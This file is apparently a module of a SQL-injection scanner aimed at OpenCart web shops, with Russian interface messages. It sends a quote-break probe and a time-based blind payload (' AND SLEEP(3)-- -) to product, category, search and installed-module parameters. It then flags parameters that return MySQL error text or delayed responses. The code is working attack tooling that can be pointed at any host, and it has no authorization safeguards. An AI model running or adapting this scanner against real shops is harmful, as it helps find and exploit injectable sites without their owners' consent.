# -*- coding: utf-8 -*-
import time
import urllib.parse

from core import http, ui
from modules import mods, profiles

ROUTES = [
    ("/index.php?route=product/product", "product_id", "1"),
    ("/index.php?route=product/category", "path", "20"),
    ("/index.php?route=product/search", "search", "a"),
]

ERR = ("sql syntax", "you have an error in your sql", "warning: mysqli",
       "mysql_fetch", "check the manual that corresponds")


def _url(route, param, value):
    base, _, qs = route.partition("?")
    parts = []
    for pair in qs.split("&"):
        if not pair:
            continue
        k, _, v = pair.partition("=")
        parts.append("%s=%s" % (k, urllib.parse.quote(value) if k == param else v))
    return base + "?" + "&".join(parts)


def _get(host, url):
    t0 = time.time()
    r = http.get(host, url, referer="https://" + host + "/")
    return r, time.time() - t0


def _safe(host, url):
    try:
        return _get(host, url)
    except Exception:
        return None, 0.0


def _err(r):
    low = r.text.lower()
    for m in ERR:
        if m in low:
            return m
    return ""


def run(host, kind="opencart"):
    hits = []
    routes = list(profiles.get(kind)["params"])
    if kind == "opencart":
        try:
            routes += mods.routes(mods.list_mods(host))
        except Exception:
            pass
    for route, param, base in routes:
        ref, _ = _safe(host, _url(route, param, base))
        if ref is None:
            ui.say("%-34s нет ответа" % param)
            continue
        ref_len = len(ref.content)

        q, _ = _safe(host, _url(route, param, base + "'"))
        if q is not None:
            mark = ""
            err = _err(q)
            if err:
                mark = "ОШИБКА SQL"
                hits.append((route, param, "error", err))
            elif abs(len(q.content) - ref_len) > max(800, ref_len // 10):
                mark = "сдвиг размера"
            ui.say("%-34s кавычка: %d %s" % (param, len(q.content), mark))

        t0 = time.time()
        _safe(host, _url(route, param, base + "' AND SLEEP(3)-- -"))
        dt = time.time() - t0
        if dt >= 2.5:
            ui.say("%-34s время: %.1f c  ВРЕМЕННАЯ" % (param, dt))
            hits.append((route, param, "time", "%.1f c" % dt))
        else:
            ui.say("%-34s время: %.1f c" % (param, dt))
        time.sleep(0.3)

    print()
    if hits:
        ui.ok("подозрительные параметры:")
        for route, param, kind, extra in hits:
            ui.say("  %s  %s  %s (%s)" % (route, param, kind, extra))
    else:
        ui.say("чисто")
